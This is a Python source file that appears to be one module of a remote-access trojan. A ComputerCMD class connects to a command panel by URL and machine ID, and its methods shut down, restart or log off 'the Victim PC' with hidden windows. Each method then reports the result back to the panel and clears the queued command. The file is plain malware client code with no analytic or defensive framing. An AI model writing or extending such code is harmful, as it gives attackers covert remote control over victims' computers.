import os, tempfile, subprocess # Ensure subprocess is imported
from HTTPSocket import HTTPSocket

class ComputerCMD:
    def __init__(self, panelURL, machineID):
        self.C = HTTPSocket(panelURL, machineID)   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir()      
                    
    def shutdown(self):
        """
        When function is called, Shutdown the Victim PC
        """
        try:
            cmd = ["shutdown", "-s", "-t", "00"]
            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            self.C.Log("Succ", "Shutdown Command Executed Successfully")
            self.C.Send("CleanCommands")
        except Exception as e:
            self.C.Send("CleanCommands")  
            self.C.Log("Fail", "An unexpected error occurred during shutdown: " + str(e)) 
      
    def restart(self):
        """
        When function is called, Restart the Victim PC
        """
        try:
            cmd = ["shutdown", "-r", "-t", "00"]
            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            self.C.Log("Succ", "Restart Command Executed Successfully")
            self.C.Send("CleanCommands")  
        except Exception as e:
            self.C.Send("CleanCommands")  
            self.C.Log("Fail", "An unexpected error occurred during restart: " + str(e)) 

    def logoff(self):
        """
        When function is called, LogOff the Victim PC
        """
        try:
            cmd = ["shutdown", "-l"]
            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, check=False)
            self.C.Log("Succ", "LogOff Command Executed Successfully")
            self.C.Send("CleanCommands")   
        except Exception as e:
            self.C.Send("CleanCommands")         
            self.C.Log("Fail", "An unexpected error occurred during logoff: " + str(e))
